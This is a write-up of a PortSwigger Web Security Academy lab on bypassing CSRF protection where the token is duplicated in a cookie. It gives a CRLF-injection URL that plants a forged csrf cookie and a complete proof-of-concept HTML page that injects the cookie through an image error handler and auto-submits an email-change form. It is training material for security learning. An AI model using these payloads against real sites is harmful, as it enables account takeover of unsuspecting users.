## Lab Description: CSRF where token is duplicated in cookie

![Uploading image.pngâ€¦]()


## Solution: 

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/334a57a4-09dc-43d7-aa2b-0bf998af37ce)

Send the request to Burp Repeater and observe that the value of the csrf body parameter is simply being validated by comparing it with the csrf cookie.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/04c29258-899c-45de-be33-b9bbef88248a)

As soon as an adversary is able to set cookie values, the CSRF-protection can be circumvented entirely.The token may or may not require the proper format, so I just try it out with an arbitrary short value:

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/d97cf252-04bd-47c5-afd5-160a155d3c6d)

Sure enough, the request goes through and the email is updated.

Perform a search, send the resulting request to Burp Repeater, and observe that the search term gets reflected in the Set-Cookie header. Since the search function has no CSRF protection, you can use this to inject cookies into the victim user's browser.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/e2d57ecd-5a8c-46eb-b1a6-f7ddb8ea3998)

Create a URL that uses this vulnerability to inject a fake csrf cookie into the victim's browser:
```
/?search=hii%0d%0aSet-Cookie:%20csrf=test
```

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/041204ac-8c79-472d-b485-d39052b876b6)

To create the exploit, I use the CSRF PoC generator of Burp Suite.And remove the auto-submit <script> block and instead add the following code to inject the cookie and submit the form:

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/ca024fb5-f2cb-4ec8-bbce-91a9ebf0c1ad)

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/d2d0e62b-a6a8-49d4-823f-d49685b0905c)

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
   <script>
      history.pushState('', '', '/');
    </script>
    <form action="https://0a9f005604ed727d817f89b2004d0000.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="go112&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="hello" />
      <input type="submit" value="Submit request" />
    </form>
   <img src="https://0a9f005604ed727d817f89b2004d0000.web-security-academy.net/?search=hii%0d%0aSet-Cookie:%20csrf=hello%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
  </body>
</html>
```

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/643021cd-89f8-4f0b-ad85-f1e0bd1d4be2)
